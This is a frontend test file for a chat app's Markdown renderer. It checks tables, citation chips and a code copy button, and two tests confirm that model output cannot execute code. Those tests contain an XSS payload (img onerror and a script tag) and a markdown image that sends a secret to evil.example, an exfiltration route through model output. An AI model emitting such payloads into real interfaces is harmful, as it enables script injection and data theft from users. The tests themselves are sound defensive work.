import { render, screen } from '@testing-library/react';

import { CitationProvider } from '@/features/chat/citation-context';

import { Markdown } from './markdown';

function renderMd(content: string, onCitationClick = vi.fn()) {
  render(
    <CitationProvider onCitationClick={onCitationClick}>
      <Markdown content={content} />
    </CitationProvider>,
  );
  return onCitationClick;
}

test('renders gfm tables and formatting', () => {
  renderMd('| a | b |\n|---|---|\n| 1 | 2 |');
  expect(screen.getByRole('table')).toBeInTheDocument();
});

test('IRON RULE 5: raw HTML in model output is never rendered as elements', () => {
  renderMd('before <img src=x onerror="window.pwned=1"> <script>window.pwned=1</script> after');
  expect(document.querySelector('img')).toBeNull();
  expect(document.querySelector('script')).toBeNull();
  expect((window as { pwned?: number }).pwned).toBeUndefined();
});

test('IRON RULE 5: markdown images are never rendered (blocks exfiltration via auto-fetched remote URLs)', () => {
  renderMd('![x](https://evil.example/steal?d=secret)');
  expect(document.querySelector('img')).toBeNull();
});

test('renders [n] as clickable citation chips', async () => {
  const { default: userEvent } = await import('@testing-library/user-event');
  const onClick = renderMd('Answer text [1] more.');
  const chip = screen.getByRole('button', { name: 'Citation 1' });
  await userEvent.setup().click(chip);
  expect(onClick).toHaveBeenCalledWith(1);
});

test('fenced code renders with a copy button', () => {
  renderMd('```py\nprint(1)\n```');
  expect(screen.getByRole('button', { name: 'Copy code' })).toBeInTheDocument();
});
